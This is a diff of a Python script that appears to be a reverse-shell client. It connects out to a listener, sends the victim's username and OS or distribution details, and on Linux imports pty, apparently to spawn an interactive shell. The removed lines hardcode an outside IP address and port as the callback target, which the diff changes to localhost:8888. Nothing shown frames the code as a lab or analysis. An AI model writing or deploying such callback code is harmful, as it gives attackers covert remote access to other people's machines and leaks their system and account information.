@@ -3,16 +3,17 @@ import subprocess
 from getpass import getuser
 import platform
 import os
+import distro
 
 
 
-os_info = platform.uname()
+os_info = distro.name()
 
 os_user = getuser()
 general_info = f"Username:{os_user}\n\nOS:{os_info}"
 
-ip = "18.158.249.75"
-port = 19088
+ip = "localhost"
+port = 8888
 
 
 
@@ -21,10 +22,10 @@ listener.connect((ip,port))
 listener.send(general_info.encode())
 
 os_type = platform.system()
-print(os_type)
+
 
 if os_type == "Linux":
-    distro = platform.platform()
+    distro = distro.name()
     linux_info = f"Distro:{distro}"
     listener.send(linux_info.encode())
     import pty
